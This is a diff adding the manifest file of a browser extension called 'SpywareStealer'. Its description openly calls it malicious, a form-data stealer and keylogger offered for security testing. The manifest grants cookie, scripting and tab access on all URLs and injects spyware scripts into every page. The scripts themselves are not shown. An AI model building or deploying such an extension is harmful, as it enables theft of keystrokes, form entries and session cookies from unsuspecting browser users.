@@ -1,0 +1,38 @@
+{
+  "manifest_version": 3,
+  "name": "SpywareStealer",
+  "author": "mauricelambert434@gmail.com",
+  "version": "1.0",
+  "description": "This extension is malicious, steal form data and implements a keylogger. It's very useful to test your software security.",
+  "options_page": "options.html",
+  "permissions": [
+    "tabs",
+    "storage",
+    "webNavigation",
+    "scripting",
+    "cookies"
+  ],
+  "host_permissions": [
+    "<all_urls>",
+    "*://*/*"
+  ],
+  "background": {
+    "service_worker": "LoadSpyware.js",
+    "scripts": ["LoadSpyware.js"]
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["SpywareStealer.js", "crypto-js.js"]
+    }
+  ],
+  "action": {
+    "default_popup": "ui.html"
+  },
+  "browser_specific_settings": {
+    "gecko": {
+      "id": "addon@spywarestealer.ml",
+      "strict_min_version": "1.0"
+    }
+  }
+}
